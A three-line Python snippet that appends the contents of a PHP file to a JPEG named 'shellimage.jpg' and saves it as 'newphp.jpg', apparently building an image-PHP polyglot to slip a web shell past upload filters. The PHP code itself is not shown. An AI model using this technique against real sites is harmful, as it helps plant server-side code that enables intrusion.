lavender = open ('shellimage.jpg','rb').read()
lavender += open ('mycode.php','rb').read()
open ('newphp.jpg','wb').write(lavender)
